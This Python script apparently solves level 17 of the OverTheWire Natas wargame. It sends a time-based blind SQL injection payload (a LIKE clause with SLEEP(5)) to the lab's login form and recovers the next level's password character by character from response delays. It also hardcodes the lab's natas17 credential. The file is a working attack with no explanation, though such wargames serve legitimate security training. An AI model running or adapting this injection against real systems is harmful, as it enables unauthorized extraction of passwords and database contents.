#!/usr/bin/python3

from string import digits,ascii_lowercase,ascii_uppercase
import requests,datetime

user = 'natas17'
passwd = '8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw'

characters = digits + ascii_uppercase + ascii_lowercase

url = 'http://%s.natas.labs.overthewire.org/' %user

session = requests.Session()

pass_search = ''


while True:
	for char in characters:
		first_time = datetime.datetime.now().second
		response = session.post(url,data={"username":"natas18\" and password LIKE '" + pass_search + char + "%' and SLEEP(5)-- -"},auth=(user,passwd))
		last_time = datetime.datetime.now().second
		if((last_time - first_time) >= 4):
			pass_search = pass_search + char
			print(pass_search)
			break
	if len(pass_search) == 32:
		break


